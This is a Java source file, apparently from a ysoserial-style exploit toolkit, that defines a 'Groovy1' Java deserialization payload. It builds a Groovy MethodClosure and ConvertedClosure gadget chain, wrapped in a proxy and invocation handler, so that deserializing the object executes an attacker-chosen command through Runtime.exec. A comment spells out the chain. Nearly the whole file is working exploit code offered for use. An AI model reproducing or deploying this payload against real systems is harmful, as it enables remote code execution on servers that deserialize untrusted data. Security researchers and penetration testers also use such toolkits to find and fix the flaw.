package payloads;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.Gadgets;
import util.PayloadRunner;

import java.lang.reflect.InvocationHandler;
import java.util.Map;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				Comparator.compare() (Proxy)
					ConvertedClosure.invoke()
						MethodClosure.call()
							...
						  		Method.invoke()
									Runtime.exec()

	Requires:
		groovy
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
@Authors({ Authors.FROHOFF })
public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {

	public InvocationHandler getObject(final String command) throws Exception {
		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");

		final Map map = Gadgets.createProxy(closure, Map.class);

		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);

		return handler;
	}

	public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
		return PayloadRunner.run(Groovy1.class, command, fusion);
	}
}
